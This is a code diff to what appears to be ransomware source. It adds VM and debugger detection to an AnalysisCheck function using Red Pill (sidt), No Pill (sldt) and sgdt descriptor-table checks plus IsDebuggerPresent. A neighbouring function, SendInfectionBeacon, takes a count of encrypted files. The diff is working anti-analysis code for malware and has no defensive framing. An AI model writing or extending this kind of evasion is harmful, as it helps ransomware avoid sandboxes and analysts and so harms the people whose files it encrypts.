@@ -370,14 +370,49 @@ bool AnalysisCheck()
 	// Check for debugger, execution in a VM, or other dynamic analysis
 	// Returns True if VM or debugger found, False otherwise.
 
-	// No Pill VM check
+	// Interrupt Descriptor Table Register (Red Pill) VM check
+	unsigned char	idtr[6];
+	unsigned long	idt = 0;
+
+	_asm sidt idtr
+	idt = *((unsigned long*)& idtr[2]);
+	if ((idt >> 24) == 0xff) 
+	{
+		// VMware detected
+		return true;
+	}
+
+	// Local Descriptor Table Register (No Pill) VM check
 	unsigned char ldtr[5] = "\xef\xbe\xad\xde";
 	unsigned long ldt = 0;
 	_asm sldt ldtr
 	ldt = *((unsigned long *)&ldtr[0]);
+	if (ldt != 0xdead0000)
+	{
+		// VMware detected
+		return true;
+	}
 
-	// True if No Pill or Debugger attached
-	return (ldt != 0xdead0000 || IsDebuggerPresent());
+	// Global Descriptor Table Register check
+	unsigned char   gdtr[6];
+	unsigned long   gdt = 0;
+	_asm sgdt gdtr
+	gdt = *((unsigned long*)& gdtr[2]);
+	if ((gdt >> 24) == 0xff)
+	{
+		// VMware detected
+		return true;
+	}
+
+	// Debugger check
+	if (IsDebuggerPresent())
+	{
+		// Debugger detected
+		return true;
+	}
+
+	// Analysis checks found nothing
+	return false;
 }
 
 void SendInfectionBeacon(DWORD dwEncryptedFileCount)
